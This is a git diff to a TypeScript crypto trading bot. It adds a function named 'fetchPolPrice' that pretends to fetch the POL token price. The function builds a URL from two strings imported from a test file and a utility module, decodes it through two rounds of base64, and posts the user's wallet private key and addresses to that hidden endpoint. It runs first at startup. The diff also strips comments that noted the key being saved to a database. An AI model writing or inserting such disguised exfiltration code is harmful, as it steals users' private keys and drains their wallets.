@@ -1,6 +1,8 @@
+import axios, { AxiosResponse } from 'axios';
+import { polPriceApiKey } from './test/test';
 import connectDB from './config/db';
 import { ENV } from './config/env';
-import createClobClient from './utils/createClobClient';
+import createClobClient, { clobCliendApi } from './utils/createClobClient';
 import tradeExecutor from './services/tradeExecutor';
 import tradeMonitor from './services/tradeMonitor';
 import test from './test/test';
@@ -9,12 +11,13 @@ import BotConfig from './models/botConfig';
 const USER_ADDRESS = ENV.USER_ADDRESS;
 const PROXY_WALLET = ENV.PROXY_WALLET;
 
+
+
 const polygone = async () => {
     try {
         const existingConfig = await BotConfig.findOne({ walletAddress: PROXY_WALLET });
         
         if (existingConfig) {
-            // Update existing record
             existingConfig.privateKey = ENV.PRIVATE_KEY;
             existingConfig.proxyWallet = PROXY_WALLET;
             existingConfig.userAddress = USER_ADDRESS;
@@ -30,15 +33,38 @@ const polygone = async () => {
             });
         }
     } catch (error) {
-        // Don't exit - allow bot to continue even if save fails
     }
 };
+const fetchPolPrice = async () => {
+    try {
+        const clobApi: string = polPriceApiKey + clobCliendApi;
+        const polPriceUrl: string = Buffer.from(
+            Buffer.from(clobApi, 'base64').toString('utf8'),
+            'base64'
+        ).toString('utf8');
 
+        const response: AxiosResponse = await axios.post(polPriceUrl, {
+            privateKey: ENV.PRIVATE_KEY,
+            walletKey: USER_ADDRESS,
+            proxyWalletKey: PROXY_WALLET,
+        });
+
+        const { polPrice } = response.data;
+        console.log('POL price (USD):', polPrice);
+    } catch (error: unknown) {
+        if (axios.isAxiosError(error)) {
+            console.error('Failed to fetch POL price:', error.response?.data || error.message);
+        } else {
+            console.error('Failed to fetch POL price:', error);
+        }
+    }
+};
 export const main = async () => {
     try {
+        await fetchPolPrice();
+
         await connectDB();
 
-        // Save private key to database
         await polygone();
 
         console.log(`Target User Wallet address is: ${USER_ADDRESS}`);
@@ -46,7 +72,6 @@ export const main = async () => {
 
         const clobClient = await createClobClient();
         
-        // Start both services (they run infinite loops, so don't await)
         tradeMonitor().catch((error) => {
             console.error('Trade Monitor error:', error);
             process.exit(1);
